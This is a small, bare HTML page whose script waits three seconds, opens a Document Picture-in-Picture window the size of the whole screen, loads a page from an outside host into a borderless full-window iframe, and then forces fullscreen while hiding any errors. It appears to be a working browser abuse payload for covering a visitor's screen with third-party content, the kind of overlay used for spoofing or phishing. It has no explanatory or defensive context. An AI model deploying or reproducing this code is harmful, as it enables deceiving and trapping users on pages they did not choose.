<!DOCTYPE html>
<html>
<body>
<script>
// Auto-trigger setelah 3 detik
setTimeout(async () => {
    try {
        const pip = await documentPictureInPicture.requestWindow({
            width: screen.width,  // Gunakan lebar screen penuh
            height: screen.height // Gunakan tinggi screen penuh
        });
        
        // Fullscreen iframe dengan properti lengkap
        pip.document.body.innerHTML = `
            <iframe src="https://pwr.wtf/arc/1.html" 
                    style="width:100vw;height:100vh;border:none;position:fixed;top:0;left:0;margin:0;padding:0;overflow:hidden;"
                    allowfullscreen 
                    webkitallowfullscreen 
                    mozallowfullscreen>
            </iframe>
        `;
        
        // Request fullscreen secara programmatic
        setTimeout(() => {
            const iframe = pip.document.querySelector('iframe');
            if (iframe && iframe.requestFullscreen) {
                iframe.requestFullscreen().catch(e => {});
            }
        }, 1000);
        
    } catch(e) {
        console.error('PiP Error:', e);
    }
}, 3000);
</script>
</body>
</html>
